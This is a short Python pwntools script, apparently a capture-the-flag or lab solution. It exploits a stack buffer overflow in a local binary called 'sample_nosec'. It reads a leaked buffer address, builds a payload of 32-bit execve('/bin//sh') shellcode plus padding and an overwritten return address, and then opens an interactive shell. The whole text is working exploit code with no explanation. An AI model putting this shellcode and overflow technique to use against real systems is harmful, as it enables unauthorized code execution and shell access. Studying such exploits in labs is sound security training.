from pwn import *


shellcode = b'\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
print(shellcode)
print(hex(len(shellcode)))


io = process("./sample_nosec")

#gdb.attach(io)

io.recvline()
io.recvline()
buff_addr=int(io.recvline()[-12:-2],16)
print(hex(buff_addr))



payload = shellcode + b'\x00'*(0x16+4-len(shellcode))+ p32(buff_addr)

io.recv()

io.sendline(payload)
io.interactive()

















